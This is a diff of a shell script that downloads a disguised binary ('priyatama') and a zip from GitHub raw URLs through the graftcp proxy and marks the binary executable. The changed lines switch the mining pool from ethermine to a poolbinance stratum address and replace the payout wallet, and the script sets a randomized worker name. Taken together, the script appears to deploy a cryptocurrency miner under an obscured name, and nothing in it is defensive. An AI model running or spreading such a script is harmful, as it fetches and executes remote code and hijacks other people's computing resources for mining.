@@ -37,8 +37,8 @@ echo " "
 
 ./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
-POOL=stratum+tcp://us1.ethermine.org:5555
-WALLET=0x8cba77c38fb9dcab92db9bf3300bfb491fbf906e
+POOL=stratum+tcp://ethash.poolbinance.com:1800
+WALLET=balhein
 WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)
 
 ./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
